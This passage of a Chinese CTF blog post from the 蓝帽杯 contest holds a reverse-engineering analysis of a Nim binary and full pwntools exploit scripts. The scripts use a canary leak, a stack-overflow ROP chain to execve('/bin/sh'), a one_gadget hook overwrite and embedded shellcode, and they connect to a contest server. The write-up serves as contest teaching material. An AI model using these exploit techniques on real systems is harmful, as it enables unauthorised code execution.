class="number">0x1ecbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld = libc_base + <span class="number">0x22e060</span></span><br><span class="line">lg(<span class="string">&#x27;rtld&#x27;</span>)</span><br><span class="line">hook = rtld + <span class="number">0xf08</span></span><br><span class="line">lg(<span class="string">&#x27;hook&#x27;</span>)</span><br><span class="line">onegadget = libc_base + <span class="number">0xe3afe</span></span><br><span class="line">lg(<span class="string">&#x27;onegadget&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change hook-&gt;onegadget</span></span><br><span class="line">hacker(<span class="number">74</span>, ptr_init)</span><br><span class="line">guest(<span class="number">74</span>, p64(hook) * <span class="number">2</span>)</span><br><span class="line">abyss(<span class="number">74</span>, onegadget)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><h3 id="babynim"><a href="#babynim" class="headerlink" title="babynim"></a>babynim</h3><p>我是首先看了一下字符串表和引用，发现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_16：&#x27;51748409119571493927314047697799213641286278894049840228804594223988372501782894889443165173295123444031074892600769905627166718788675801&#x27;</span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_12：&#x27;56006392793428440965060594343955737638876552919041519193476344215226028549209672868995436445345986471&#x27;</span><br><span class="line"></span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_19 -&gt; TM__xLHv575t3PG1lB5wK05Xqg_20 -&gt; &#x27;error&#x27;</span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_17 -&gt; TM__xLHv575t3PG1lB5wK05Xqg_18 -&gt; &#x27;win&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过符号表找到主函数，一路追加找到关键函数<code>NimMainModule()</code>，一下是一些关键代码（做了一点注释）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取我们的输入</span></span><br><span class="line">	Line__systemZio_364 = (_QWORD *)readLine__systemZio_364(v0);</span><br><span class="line">	we_ipt = Line__systemZio_36</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定输入字符串的长度为42</span></span><br><span class="line">    input__hello_2 = (__int64)Line__systemZio_364;</span><br><span class="line">    <span class="keyword">if</span> ( *Line__systemZio_364 != <span class="number">42</span>i64 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">      v5 = check__hello_3;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定flag的格式</span></span><br><span class="line">  <span class="keyword">if</span> ( flag-&gt;m128i_i64[<span class="number">0</span>] != <span class="string">&#x27;\x05&#x27;</span> || flag[<span class="number">1</span>].m128i_i32[<span class="number">0</span>] != <span class="string">&#x27;galf&#x27;</span> || flag[<span class="number">1</span>].m128i_i8[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int64 *)input__hello_2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对输入的数据进行处理，取中间的36位</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(input__hello_2 + <span class="number">57</span>) == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>i64;</span><br><span class="line">    v12 = mnewString(<span class="number">36</span>i64);</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      raiseIndexError2(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12-&gt;m128i_i64[<span class="number">0</span>] &lt;= (<span class="type">unsigned</span> __int64)v11 )</span><br><span class="line">        raiseIndexError2(v11, v12-&gt;m128i_i64[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      v13 = v11 + <span class="number">5</span>;	<span class="comment">// 屏蔽开始的&#x27;flag&#123;&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> ( v11 + <span class="number">5</span> &lt; <span class="number">0</span> || v13 &lt; v11 )</span><br><span class="line">        raiseOverflow();</span><br><span class="line">      <span class="keyword">if</span> ( *v9 &lt;= v13 )</span><br><span class="line">        raiseIndexError2(v11 + <span class="number">5</span>, *v9 - <span class="number">1</span>);</span><br><span class="line">      v12[<span class="number">1</span>].m128i_i8[v11++] = *((_BYTE *)v9 + v13 + <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 &lt;= <span class="number">35</span> );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对我们输入的数字和TM__xLHv575t3PG1lB5wK05Xqg_12指向的数字进行相乘</span></span><br><span class="line">	<span class="comment">// 将v12载入x__hello_40</span></span><br><span class="line">	initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987((__int64)v12, <span class="number">10</span>i64, &amp;x__hello_40);</span><br><span class="line">    <span class="comment">// 将TM__xLHv575t3PG1lB5wK05Xqg_12载入a__hello_41</span></span><br><span class="line">	initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987(</span><br><span class="line">      (__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_12,</span><br><span class="line">      <span class="number">10</span>i64,</span><br><span class="line">      &amp;a__hello_41);</span><br><span class="line">    v21 = <span class="number">0</span>i64;</span><br><span class="line">    v22 = <span class="number">0</span>i64;</span><br><span class="line">    v20 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;x__hello_40);	<span class="comment">// 将x__hello_40载入v20</span></span><br><span class="line">    v19 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;a__hello_41);	<span class="comment">// 将a__hello_41载入v19</span></span><br><span class="line">    star___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1219(&amp;v20, &amp;v19, &amp;v21);</span><br><span class="line">	v14 = v21;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入star___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1219函数，发现是相乘的操作</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+48h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  genericSeqAssign(</span><br><span class="line">    (<span class="type">char</span> *)&amp;v5,</span><br><span class="line">    (__int64)&amp;TM__7msO9agWKbXtldQioKYEG4w_61,</span><br><span class="line">    (__int64)&amp;NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">  genericSeqAssign(a3, v5, (__int64)&amp;NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">  a3[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> multiplication__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1010(a3);	<span class="comment">// multiplication</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较相乘后的数字与TM__xLHv575t3PG1lB5wK05Xqg_17指向的数字是否相同</span></span><br><span class="line">	<span class="comment">// 将v14载入result__hello_43</span></span><br><span class="line">	genericSeqAssign((<span class="type">char</span> *)&amp;result__hello_43, v14, (__int64)refptr_NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">    BYTE8(result__hello_43) = byte_42C188;</span><br><span class="line">    initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987(</span><br><span class="line">      (__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_16,</span><br><span class="line">      <span class="number">10</span>i64,</span><br><span class="line">      &amp;res__hello_44);</span><br><span class="line">    v20 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;result__hello_43);	<span class="comment">// 将result__hello_43载入v20</span></span><br><span class="line">    v19 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;res__hello_44);		<span class="comment">// 将res__hello_44载入v19</span></span><br><span class="line">    <span class="keyword">if</span> ( eqeq___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_259(&amp;v20, &amp;v19) )	<span class="comment">// 比较v20和v19的值是否相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      check__hello_3 = <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_17, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// win</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_19, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// error</span></span><br><span class="line">  <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_17, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// win</span></span><br></pre></td></tr></table></figure>
+
+<p>所以实际上的操作就是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">we_input * <span class="number">56006392793428440965060594343955737638876552919041519193476344215226028549209672868995436445345986471</span> == <span class="number">51748409119571493927314047697799213641286278894049840228804594223988372501782894889443165173295123444031074892600769905627166718788675801</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="szp2"><a href="#szp2" class="headerlink" title="szp2"></a>szp2</h3><p>去除了符号表，不过我们通过字符串就可以知道程序在干什么，一道虽然看上去繁杂的题目，其实只需要利用一处的栈溢出漏洞就可以实现攻击，漏洞如下（两次相同位置的栈溢出）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v151, <span class="number">0</span>, <span class="keyword">sizeof</span>(v151));</span><br><span class="line">    v152 = <span class="number">0</span>;</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;你试着给她发短信说道:&quot;</span>);</span><br><span class="line">    sub_64150(<span class="number">0LL</span>, v151, <span class="number">256LL</span>);		<span class="comment">// 栈溢出</span></span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;十分钟过去了，你没有得到回应……&quot;</span>);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;十分钟过去了，你没有得到回应……&quot;</span>, (__int64)v151, v131, v132, v133, v134);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;你盯着屏幕上的文字:%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v151);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;你盯着屏幕上的文字:%s&quot;</span>, (__int64)v151, v135, v136, v137, v138);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;又发了一条短信:&quot;</span>);</span><br><span class="line">    sub_64150(<span class="number">0LL</span>, v151, <span class="number">256LL</span>);		<span class="comment">// 栈溢出</span></span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;信息就像石沉大海，惊不起一丝波澜……&quot;</span>);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;信息就像石沉大海，惊不起一丝波澜……&quot;</span>, (__int64)v151, v139, v140, v141, v142);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;俗话说“事出反常必有妖”，感情中也是同样的道理，如果你遇到一个人，各个方面都符合甚至超出你对另一半的预期，重点是ta还特别上赶着你，那么不要高兴太早，你很可能遇到了骗子。&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>题目是静态链接，所以vmmap中看不到libc，不过我们可以找到可以用的gadget片段，WP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./szp2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;47.95.8.59&#x27;</span>, <span class="number">33903</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./szp2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;请选择: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;确定角色?确认后无法更改(Y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;账户名:&#x27;</span>, <span class="string">b&#x27;zyy&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;你的积蓄:￥&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;充值金额:￥&#x27;</span>, <span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;你试着给她发短信说道:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;十分钟过去了，你没有得到回应……&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;aaaaaab&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + r(<span class="number">7</span>))</span><br><span class="line">stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;又发了一条短信:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(canary) + p64(stack))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;请选择: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;确定角色?确认后无法更改(Y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;账户名:&#x27;</span>, <span class="string">b&#x27;zyy&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;你的积蓄:￥&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;充值金额:￥&#x27;</span>, <span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;你试着给她发短信说道:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa8</span>)</span><br><span class="line">sa(<span class="string">&#x27;十分钟过去了，你没有得到回应……&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">codebase = uu64() - <span class="number">0xb885</span></span><br><span class="line">lg(<span class="string">&#x27;codebase&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rax_r = codebase + <span class="number">0x0000000000064d97</span></span><br><span class="line">p_rdi_r = codebase + <span class="number">0x0000000000009cc2</span></span><br><span class="line">p_rsi_r = codebase + <span class="number">0x0000000000018c9e</span></span><br><span class="line">p_rdx_r = codebase + <span class="number">0x0000000000009bcf</span></span><br><span class="line">syscall = codebase + <span class="number">0x0000000000009673</span></span><br><span class="line">pld = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pld = pld.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pld += p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">59</span>)</span><br><span class="line">pld += p64(p_rdi_r) + p64(stack - <span class="number">0xd0</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(syscall)</span><br><span class="line">sa(<span class="string">&#x27;又发了一条短信:&#x27;</span>, pld)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/" rel="tag"># 蓝帽杯</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/09/19/CTF/2022%E6%9F%8F%E9%B9%AD%E6%9D%AF/" rel="next" title="2022 柏鹭杯">
+                <i class="fa fa-chevron-left"></i> 2022 柏鹭杯
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/10/09/Pwn/Vm/" rel="prev" title="Vm Pwn">
+                Vm Pwn <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
